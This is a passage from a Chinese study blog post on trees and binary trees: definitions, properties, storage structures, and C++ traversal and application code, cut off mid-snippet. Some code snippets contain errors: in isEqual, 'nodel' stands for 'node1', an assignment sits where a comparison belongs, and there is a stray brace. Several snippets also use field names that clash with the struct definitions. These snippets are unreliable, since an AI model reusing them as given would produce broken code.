<strong>叶子结点</strong>。</p><p>结点的层次从树根开始定义，根结点为第1层，它的子结点为第2层，以此类推。结点的<strong>深度</strong>是<u>从根结点</u>开始自顶向下逐层累加的；结点的<strong>高度</strong>是<u>从叶结点</u>开始自底向上逐层累加的。树中结点的最大层数称为<strong>树的高度或深度</strong>。</p><p>有序树和无序树：将子结点视为有顺序的树称为有序树，反之则称为无序树。有序树中，一个结点其子结点按从左到右顺序出现是有关联的。</p><p><strong>森林</strong>是m (m≥0)棵互不相交的树的集合。森林的概念与树的概念十分相近，因为只要把树的根结点删去就成了森林。反之，只要给n棵独立的树加上一个结点，并把这n棵树作为该结点的子树，则森林就变成了树。</p><h4 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h4><p><strong>树具有如下最基本的性质:</strong></p><ol><li>树中的结点数等于所有结点的度数加1。</li><li><strong>度为m的树中第i层上至多有$m^{i-1}$个结点（i≥1）</strong>。</li><li>高度为h的m叉树至多有$(m^h-1)&#x2F;(m- 1)$个结点。（1、$m$、$m^2$、…、$m^{h-1}$的等比数列求和）</li><li>具有n个结点的m叉树的最小高度为$[log_{m}(n(m -1)+1)]$。 （根据$n&#x3D;(m^h-1)&#x2F;(m- 1)$计算得到）</li></ol><h4 id="树的存储结构"><a href="#树的存储结构" class="headerlink" title="树的存储结构"></a>树的存储结构</h4><ul><li><p><strong>双亲存储结构</strong></p><p>树的一种顺序存储结构，用一组连续空间存储树的所有结点，每个结点中设有一个伪指针指示其双亲结点的位置。固定根结点的双亲结点位置为-1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">ElemType data; <span class="comment">// 存放结点的值</span></span><br><span class="line">    <span class="type">int</span> parent;    <span class="comment">// 存放双亲结点位置</span></span><br><span class="line">&#125;PTree[MAxSize];</span><br></pre></td></tr></table></figure><p>特点：容易查找某个结点的双亲结点，但是在求某个结点的孩子结点时需要遍历整个树。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713200419420.png" alt="image-20220713200419420" style="zoom:20%;"></li><li><p><strong>孩子链存储结构</strong></p><p>每个结点的存储空间不仅包括结点值，还有指向其所有孩子结点的指针。需要按照树的度来设计结点的孩子结点指针的指针域个数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct node&#123;</span><br><span class="line">ElemType data;                 // 存放结点的值</span><br><span class="line">    struct node *sons[MaxSons];    // 指向孩子结点，MaxSons为最多的孩子结点个数，即该树的度</span><br><span class="line">&#125;PTree[MAxSize];</span><br></pre></td></tr></table></figure><p>特点：查找孩子结点方便，但是查找双亲结点费时，并且当树的度较大时存在较多的空指针域。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713201928679.png" alt="image-20220713201928679" style="zoom:20%;"></li><li><p><strong>孩子兄弟链存储结构</strong></p><p>每个结点设计了3个域，包括<u>数据元素域</u>、一个指向该结点的<u>左边第一个孩子</u>的指针域、一个指向该结点的<u>下一个兄弟</u>结点的指针域。这样每个结点就固定只有2个指针域，且这两个指针域是有序的（类似二叉树的存储结构）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tnode</span>&#123;</span><br><span class="line">ElemType data;       <span class="comment">// 存放结点的值</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tnode</span> *hp;    <span class="comment">// 指向兄弟结点</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">tnode</span> *vp;    <span class="comment">// 指向孩子结点</span></span><br><span class="line">&#125;TSBNode;</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-2-二叉树"><a href="#3-2-二叉树" class="headerlink" title="3.2 二叉树"></a>3.2 二叉树</h3><p>二叉树是另一种树形结构(是n (n≥0)个结点的有限集合)，其特点是每个结点至多只有两棵子树(即二叉树中不存在度大于2的结点)，并且，二叉树的<u>子树有左右之分，其次序不能任意颠倒</u>。</p><p>二叉树是有序树，若将其左、右子树颠倒，就成为另一棵不同的二叉树。即使树中结点只有一棵子树，也要区分它是左子树还是右子树。</p><p>**<u>注意：</u>**二叉树与度为2的有序树的区别：度为2的树至少有3个结点，而二叉树可以为空；度为2的有序树的孩子结点的左右次序是相对于另一孩子结点而言的，如果某个结点只有一个孩子结点，这个孩子结点就无须区分其左右次序，而二叉树无论其孩子数是否为2，均需确定其左右次序。</p><p>下面介绍几种特殊的二叉树。</p><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a><strong>满二叉树</strong></h4><p><u>叶子结点都集中在二叉树的最下一层</u>， 并且<u>除叶子结点之外的每个结点度数均为2</u>的二叉树称为满二叉树，即树中的每一层都含有最多的结点，如图13-1(a)所示。或者也可以说一棵高度为h且含有$2^h-1$ 个结点的树为满二叉树。</p><p>可以对满二叉树按层序编号：约定编号从根结点(根结点编号为1) 起，自上而下，自左向右。这样每个结点对应一一个编号， 对于编号为i的结点，如果有双亲，其<u>双亲</u>为⌊i&#x2F;2⌋，如果有左孩子，则<u>左孩子</u>为2i；如果有右孩子，则<u>右孩子</u>为2i+1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220713205538873.png" alt="image-20220713205538873"></p><h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a><strong>完全二叉树</strong></h4><p>设一个高度为h，有n个结点的二叉树，当且仅当其每一个结点都与高度为h的满二叉树中编号为1~n的结点一一对应时，称为完全二叉树，如图13- 1(b)所示。这种树的特点如下:</p><p>① 若$i≤\lfloor n&#x2F;2 \rfloor$，则结点i为分支结点，否则为叶子结点。（层次遍历，前一半的结点均为分支结点，后一半均为叶子结点）</p><p>② **<u>叶子结点只可能在层次最大的两层上出现</u><strong>。</strong><u>最大层次中的叶子结点都依次排列在该层最左边的位置上</u>**。</p><p>③ 如果有度为1的结点，只可能有一个，且该结点<u>只有左孩子</u>而无右孩子。</p><p>④ 按层序编号后，一旦出现某结点(其编号为i)为叶子结点或只有左孩子，则编号大于i的结点均为叶子结点。</p><p>⑤ 若n为奇数，则每个分支结点都有左孩子和右孩子；<u>若n为偶数，则编号最大的分支结点(编号为n&#x2F;2)只有左子女，没有右子女</u>，其余分支结点左、右子女都有。</p><p><u>注意</u>：性质3中表明完全二叉树中，<u><strong>度为1的结点数</strong> 要么为0，要么为1</u>。<strong>当总结点数为偶数时，度为1的结点数为1；当总结点数为奇数时，度为1的结点数为0。</strong><u><strong>叶子结点数</strong> 为：总结点数&#x2F;2</u>。</p><h4 id="二叉树的性质"><a href="#二叉树的性质" class="headerlink" title="二叉树的性质"></a>二叉树的性质</h4><p>二叉树的性质</p><ol><li><strong>非空二叉树上<u>叶子结点（度为0）数等于度为2的结点数加1</u>，即$\large N_0&#x3D;N_2+1$。</strong></li></ol><p><strong>证明</strong>：设度为0、1和2的结点个数分别为$N_0$、$N_1$和$N_2$，结点总数$N$&#x3D;$N_0$+$N_1$+$N_2$。再看二叉树中的分支数，除根结点外，其余结点都有一个分支进入，设B为分支总数，则$N&#x3D;B+1$。由于这些分支是由度为1或2的结点射出的，所以又有$B$ &#x3D;$N_1$+$2N_2$。于是得$\large N_0&#x3D;N_2+1$.</p><ol start="2"><li><p>非空二叉树上第K层上至多有$2^{k-1}$个结点(K≥1)。</p></li><li><p>**高度为H的二叉树至多有$2^H-1$个结点(H≥1)**。</p></li><li><p>对完全二叉树按从上到下、从左到右的顺序<u>依次编号1, 2, …, N，则有以下关系</u>：</p></li></ol><p>a) 当i&gt;1时，结点i的双亲结点编号为⌊i&#x2F;2⌋，即当i为偶数时，其双亲结点的编号为i&#x2F;2，它是双亲结点的左孩子；当i为奇数时，其双亲结点的编号为(i -1)&#x2F;2，它是双亲结点的右孩子。</p><p>b) 当2i≤N时，结点i的<strong>左孩子编号为2i</strong>,否则无左孩子。</p><p>c) 当2i+1≤N时，结点i的<strong>右孩子编号为2i+1</strong>, 否则无右孩子。</p><p>d) 结点i所在层次(深度)为$⌊log_2i⌋+1$。</p><ol start="5"><li>具有N个(N&gt;0)结点的 <strong>完全二叉树的高度</strong> 为$\lfloor log_2N \rfloor +1$ 或者 $\lceil log_2(N+1) \rceil \space$。</li></ol><blockquote><p>例题：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220714092056003.png" alt="image-20220714092056003"></p></blockquote><h4 id="二叉树的存储结构"><a href="#二叉树的存储结构" class="headerlink" title="二叉树的存储结构"></a>二叉树的存储结构</h4><ul><li><p>二叉树的顺序存储结构</p><p>顺序存储就是用一组地址连续的存储单元依次自上而下、自左而右存储完全二叉树的结点元素，即<u>将完全二叉树编号为i的结点元素存储在某个数组下标为i-1的分量中</u>。对于一般二叉树，则应将其每个结点与完全二叉树上的结点相对照，存储在一维数组的相应分量中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> ElemType SqBinTree[MaxSize];   # 为方便运算，一般下标为<span class="number">0</span>的位置空着，空结点用<span class="string">&quot;#&quot;</span>表示</span><br></pre></td></tr></table></figure><p>然而，在最坏的情况下，一个高度为H且只有H个结点的单支树却需要占据接近$2^H-1$个存储单元。因此，顺序存储结构<u>一般仅适用在完全二叉树中</u>。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220714093138887.png" alt="image-20220714093138887"></p></li><li><p>二叉树的链式存储结构</p><p>每个结点由三个域组成，包括数据域、指向该结点左孩子结点的指针域、指向该结点右孩子结点的指针域。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">  ElemType data;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">node</span> *lchild;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">node</span> *rchild;</span><br><span class="line">  &#125;BTNode;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220714093353067.png" alt="image-20220714093353067"></p><p>容易验证，在有n个结点的二叉树中，每个结点有2个指针域，因此一共存在2n个链域。其中，除根结点外，其余结点均有指针指向，因此，有n-1个有效链域，n+1个空链域。</p></li></ul><h4 id="x3D-x3D-二叉树的遍历-x3D-x3D"><a href="#x3D-x3D-二叉树的遍历-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;二叉树的遍历&#x3D;&#x3D;"></a>&#x3D;&#x3D;二叉树的遍历&#x3D;&#x3D;</h4><p>很多问题的求解是借助二叉树的遍历完成的。重点为<u><strong>二叉树遍历的非递归算法</strong></u>。</p><ul><li><strong>&#x3D;&#x3D;先序遍历&#x3D;&#x3D;</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------递归-------------*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PreOrder</span><span class="params">(BTNode *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>, b-&gt;data);</span><br><span class="line">        <span class="built_in">PreOrder</span>(b-&gt;lchild);</span><br><span class="line">        <span class="built_in">PreOrder</span>(b-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------非递归（使用顺序栈实现）-------------*/</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">preorderTraversal</span><span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    stack&lt;BTNode*&gt; s;  <span class="comment">//辅助栈</span></span><br><span class="line">    <span class="comment">//根节点先进栈</span></span><br><span class="line">    s.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="comment">//直到栈中没有节点</span></span><br><span class="line">    <span class="keyword">while</span>(!s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="comment">//每次栈顶就是访问的元素</span></span><br><span class="line">        BTNode* node = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        res.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">        <span class="comment">//如果有右孩子，则右孩子进栈</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">            s.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        <span class="comment">//如果有左孩子，则左孩子进栈</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">            s.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>&#x3D;&#x3D;中序遍历&#x3D;&#x3D;</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------递归-------------*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrder</span><span class="params">(BTNode *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">InOrder</span>(b-&gt;lchild);</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>, b-&gt;data);</span><br><span class="line">        <span class="built_in">InOrder</span>(b-&gt;rchild);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------非递归（使用顺序栈实现）-------------*/</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">inorderTraversal</span><span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    stack&lt;BTNode*&gt; s;  <span class="comment">//辅助栈</span></span><br><span class="line">    <span class="comment">//当树结点不为空或栈中有结点时</span></span><br><span class="line">    <span class="keyword">while</span>(root != <span class="literal">NULL</span> || !s.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="comment">//每次先找到最左结点，路径上的结点均入栈</span></span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            s.<span class="built_in">push</span>(root);</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//弹出栈顶</span></span><br><span class="line">        BTNode* node = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        res.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">        <span class="comment">//左孩子为空，进入右孩子结点</span></span><br><span class="line">        root = node-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>&#x3D;&#x3D;后序遍历&#x3D;&#x3D;</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------递归-------------*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrder</span><span class="params">(BTNode *b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(b != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">PostOrder</span>(b-&gt;lchild);</span><br><span class="line">        <span class="built_in">PostOrder</span>(b-&gt;rchild);</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%c&quot;</span>, b-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------非递归（使用顺序栈实现）-------------*/</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">postorderTraversal</span><span class="params">(BTNode* root)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;   <span class="comment">// 返回结果</span></span><br><span class="line">    stack&lt;BTNode*&gt; s;  <span class="comment">//辅助栈</span></span><br><span class="line">    BTNode* pre = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(root != <span class="literal">NULL</span> || !s.<span class="built_in">empty</span>())&#123;    <span class="comment">// 指针root和栈均为空时结束循环</span></span><br><span class="line">        <span class="comment">//每次先找到最左边的结点，路径上的结点均入栈</span></span><br><span class="line">        <span class="keyword">while</span>(root != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            s.<span class="built_in">push</span>(root);</span><br><span class="line">            root = root-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//弹出栈顶</span></span><br><span class="line">        BTNode* node = s.<span class="built_in">top</span>();</span><br><span class="line">        s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">//如果该结点没有右孩子或是右孩子已经访问过</span></span><br><span class="line">        <span class="keyword">if</span>(node-&gt;right == <span class="literal">NULL</span> || node-&gt;right == pre)&#123;</span><br><span class="line">            <span class="comment">//访问该结点自身</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="comment">//且记录为访问过了</span></span><br><span class="line">            pre = node;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//有右孩子，则该结点入栈，先去访问右孩子</span></span><br><span class="line">            s.<span class="built_in">push</span>(node);</span><br><span class="line">            root = node-&gt;right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>层序遍历</strong>（借助队列实现）</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*-------------使用队列实现-------------*/</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">levelOrder</span>(BTNode* root) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; res;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">NULL</span>) <span class="keyword">return</span> res;</span><br><span class="line">    queue&lt;BTNode *&gt; qu;</span><br><span class="line">    qu.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        <span class="type">int</span> size = qu.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; vec;</span><br><span class="line">        <span class="keyword">while</span> (size--) &#123;</span><br><span class="line">            <span class="comment">// 取队首结点</span></span><br><span class="line">            BTNode *node = qu.<span class="built_in">front</span>();</span><br><span class="line">            qu.<span class="built_in">pop</span>();</span><br><span class="line">            vec.<span class="built_in">push_back</span>(node-&gt;val);</span><br><span class="line">            <span class="comment">// 左右孩子入队</span></span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left) qu.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right) qu.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (vec.<span class="built_in">size</span>() &gt; <span class="number">0</span>) res.<span class="built_in">push_back</span>(vec);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-二叉树的应用"><a href="#3-3-二叉树的应用" class="headerlink" title="3.3 二叉树的应用"></a>3.3 二叉树的应用</h3><blockquote><ol><li><em><strong>判断两颗二叉树是否相同。</strong></em></li></ol></blockquote><p>运用递归的方法，按照先序遍历对比即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *right;</span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isEqual</span> <span class="params">(BTNode* node1, BTNode* node2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//树为空的情况</span></span><br><span class="line">    <span class="keyword">if</span> (nodel == <span class="literal">NULL</span> &amp;&amp; node2 = <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!nodel || !node2) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//根结点相等，继续对比左孩子和右孩子</span></span><br><span class="line">    <span class="keyword">if</span> (nodel-&gt;val == node2-&gt;val)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">isEqual</span> (node1-&gt;left, node2-&gt;left) &amp;&amp; <span class="built_in">isEqual</span> (node1-&gt;right, node2-&gt;right);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进一步的，比较两棵可以旋转的二叉树是否相等。二叉树的左右子结点可以旋转是指可以把二叉树的左结点旋转成为右结点，右结点旋转成为左结点。(2012. 百度)</p><p>若左右子结点可以旋转的话，需要将递归的return代码改为如下内容：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">isEqual</span> (node1-&gt;left, node2-&gt;left) &amp;&amp; <span class="built_in">isEqual</span> (node1-&gt;right, node2-&gt;right)) || </span><br><span class="line">(<span class="built_in">isEqual</span> (node1-&gt;left, node2-&gt;right) &amp;&amp; <span class="built_in">isEqual</span> (node1-&gt;right, node2-&gt;left));</span><br></pre></td></tr></table></figure><blockquote><ol start="2"><li><em><strong>求二叉树的深度</strong></em></li></ol></blockquote><p>从根结点到叶结点依次经过的结点(含根、叶结点)形成树的一条路径，最长路径的长度为树的深度。（相当于做后序遍历）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *right;</span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BTHeight</span><span class="params">(BTNode *root)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> lefth, righth;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        lefth = <span class="built_in">BTHeight</span>(root-&gt;left);</span><br><span class="line">        righth = <span class="built_in">BTHeight</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> (lefth &gt; righth)? (lefth+<span class="number">1</span>):(righth+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ol start="3"><li><em><strong>求二叉树中结点的最大距离</strong></em></li></ol></blockquote><p>如果我们把二叉树视为一个图，父子结点之间的连线视为双向的，我们姑且定义“距离”为两结点之间边的个数。写一个程序求一棵二叉树中相距最远的两个结点之间的距离。</p><p>分析：计算-一个二叉树的最大距离有两个情况：</p><p>情况A：路径经过左子树的最深结点，通过根结点，再到右子树的最深结点。<br>情况B：路径不穿过根结点，而是左子树或右子树的最大距离路径，取其大者。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220715091403774.png" alt="image-20220715091403774"></p><p>只需要计算这两个情况的路径距离，并取其大者，就是该二叉树的最大距离。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *left;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *right;</span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">RESULT</span>&#123;<span class="comment">//定义返回结果</span></span><br><span class="line"><span class="type">int</span> MaxDistance; <span class="comment">//最大距离</span></span><br><span class="line"><span class="type">int</span> MaxDepth;<span class="comment">//最大深度</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">RESULT <span 